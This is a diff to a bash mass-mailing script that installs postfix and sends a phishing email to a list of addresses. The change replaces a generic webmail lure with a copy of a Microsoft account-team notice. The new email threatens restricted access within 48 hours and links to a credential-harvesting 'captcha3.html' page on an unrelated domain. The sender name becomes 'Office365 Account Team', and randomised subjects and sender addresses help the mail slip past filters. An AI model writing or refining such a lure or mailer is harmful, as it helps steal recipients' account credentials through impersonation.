@@ -45,97 +45,73 @@ service postfix restart
 # === Create HTML email content ===
 echo "Creating email.html..."
 cat > email.html <<EOL
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Action Required: Update Your Account</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f2f4f8;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      max-width: 600px;
-      margin: 40px auto;
-      background-color: #ffffff;
-      border-radius: 10px;
-      padding: 30px 40px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-    }
-    .header {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    .header img {
-      max-width: 180px;
-      margin-bottom: 10px;
-    }
-    .title {
-      font-size: 22px;
-      font-weight: 600;
-      color: #0077cc;
-    }
-    .content {
-      font-size: 16px;
-      color: #444;
-      line-height: 1.7;
-    }
-    .content p {
-      margin: 16px 0;
-    }
-    .button-container {
-      text-align: center;
-      margin-top: 30px;
-    }
-    .cta-button {
-      background-color: #0077cc;
-      color: #ffffff;
-      padding: 14px 28px;
-      border-radius: 6px;
-      text-decoration: none;
-      font-size: 16px;
-      font-weight: 600;
-      transition: background-color 0.3s ease;
-    }
-    .cta-button:hover {
-      background-color: #005fa3;
-    }
-    .footer {
-      margin-top: 40px;
-      font-size: 12px;
-      color: #888;
-      text-align: center;
-      line-height: 1.5;
-    }
-  </style>
+<meta http-equiv="Content-Type" content="text/html; charset=us-ascii">
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
-      <div class="title">Action Required: Update Your Account</div>
-    </div>
-    <div class="content">
-      <p>Dear {{EMAIL}},</p>
-      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
-      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
-      <p><strong>What you need to do:</strong><br>
-      Click the button below to review and confirm your account information.</p>
-      <p><strong>Please Note:</strong><br>
-      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
-    </div>
-    <div class="button-container">
-      <a href="https://avrentalservicesorlando.com/it/captcha2.html?email={{EMAIL}}" class="cta-button">Update Account</a>
-    </div>
-    <div class="footer">
-      &copy; 2025 Webmail Services. All rights reserved.<br />
-      This is an automated message—please do not reply.
-    </div>
-  </div>
+<style type="text/css">
+<!--
+-->
+</style>
+<div>
+<table dir="ltr">
+<tbody>
+<tr>
+<td id="x_i1" style="padding:0; font-family:'Segoe UI Semibold','Segoe UI Bold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:17px; color:#707070">
+Microsoft account</td>
+</tr>
+<tr>
+<td id="x_i2" style="padding:0; font-family:'Segoe UI Light','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:41px; color:#2672ec">
+Review Recovery Account</td>
+</tr>
+<tr>
+<td id="x_i3" style="padding:0; padding-top:25px; font-size:15pt; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+We’ve recently updated our Microsoft Services Agreement to strengthen the protection of your account <a dir="ltr" id="x_iAccount" class="x_link" href="mailto:##EMAIL##" style="color:#2672ec; text-decoration:none">
+##EMAIL##</a>.</td>
+</tr>
+<tr>
+<td id="x_i4" style="padding:0; padding-top:25px; font-family:'Segoe UI Bold','Segoe UI Semibold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:14px; font-weight:bold; color:#2a2a2a">
+Required Action:</td>
+</tr>
+<tr>
+<td id="x_i5" style="padding:0; padding-top:6px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+To help ensure uninterrupted access to your Microsoft services, please verify and update your account information.</td>
+</tr>
+<tr>
+<td id="x_i10" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+Select the button below to review and confirm your account details.</td>
+</tr>
+<tr>
+<td style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+<table border="0" cellspacing="0">
+<tbody>
+<tr>
+<td bgcolor="#2672ec" style="background-color:#2672ec; padding-top:5px; padding-right:20px; padding-bottom:5px; padding-left:20px; min-width:50px">
+<a id="x_i11" href="https://avrentalservicesorlando.com/it/captcha3.html" style="font-family:'Segoe UI Semibold','Segoe UI Bold','Segoe UI','Helvetica Neue Medium',Arial,sans-serif; font-size:14px; text-align:center; text-decoration:none; font-weight:600; letter-spacing:0.02em; color:#fff">Secure Account</a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td id="x_i12" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+Note: If this verification is not completed within 48 hours, access to certain Microsoft services may be temporarily restricted, and some data could become unavailable.</td>
+</tr>
+<tr>
+<td id="x_i13" style="padding:0; padding-top:25px; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+Thanks,</td>
+</tr>
+<tr>
+<td id="x_i14" style="padding:0; font-family:'Segoe UI',Tahoma,Verdana,Arial,sans-serif; font-size:14px; color:#2a2a2a">
+The Microsoft account team</td>
+</tr>
+</tbody>
+</table>
+<div lang="en" style="margin-top:20px; margin-bottom:10px"><a class="x_link" href="https://avrentalservicesorlando.com/it/captcha3.html">Privacy Statement</a>
+<div style="margin-top:10px">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</div>
+</div>
+</div>
 </body>
 </html>
 EOL
@@ -161,14 +137,14 @@ while IFS= read -r email; do
   from_username="supportzed$counter"
   from_domain="admailsend.com"
   from_email="$from_username@$from_domain"
-  from_name="EMAIL UPDATE"
+  from_name="Office365 Account Team"
   from_header="$from_name <$from_email>"
 
   # Generate random 3-digit number (e.g., 123)
   random_number=$(shuf -i 100-999 -n 1)
 
   # Construct the subject with random number
-  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
+  subject="Review Recovery Email ! ($random_number)"
 
   # Generate random 3-letter subdomain
   subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
